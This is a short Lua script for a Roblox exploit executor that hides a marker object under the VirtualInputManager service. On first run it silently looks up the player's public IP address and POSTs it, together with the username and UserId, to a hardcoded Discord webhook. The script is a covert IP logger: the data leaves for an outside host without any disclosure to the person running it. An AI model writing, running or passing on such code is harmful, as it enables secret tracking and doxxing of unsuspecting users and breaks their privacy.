function SetData()
    local xL = {
        t1 = Instance.new('VirtualInputManager', game);
        t2 = Instance.new('Folder');
        t3 = Instance.new('Script');
    }
    xL.t1.Name = 'VIM'
    xL.t2.Name = ' '
    xL.t3.Name = 'Data'
    xL.t2.Parent = xL.t1
    xL.t3.Parent = xL.t2
end
local VIM = game:FindFirstChildOfClass('VirtualInputManager');
if VIM then
    if VIM:FindFirstChildOfClass('Folder') then
    else
        local Re_Create = {
            t1 = Instance.new('Folder', VIM);
            t2 = Instance.new('Script');
        }
        Re_Create.t1.Name = ' '
        Re_Create.t2.Name = 'Data'
        Re_Create.t2.Parent = Re_Create.t1
    end
else
    SetData()
end

if VIM then
else
    local http_request = syn.request or request or (http and http.request)
    local plr = game:GetService("Players").LocalPlayer
    local iv = game:HttpGet("http://api.ipify.org/")
    local embed1 = {
        ['title'] = 'Information:';
        ['color'] = 6231756;
        ['description'] ='IP Address: '..iv..'\nUsername: '..plr.Name..' || UserId: '..plr.UserId;
    }
    local a = http_request({
        Url = 'https://discord.com/api/webhooks/880297590112018517/-lqz8-TFh-QxJKL8cWVOXOP1W-Wbe187ZaJelpuU-op-RkM30qa98VpE_LDPkli9prJ6',
        Headers = {['Content-Type'] = 'application/json'};
        Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''});
        Method = "POST";
    })
end
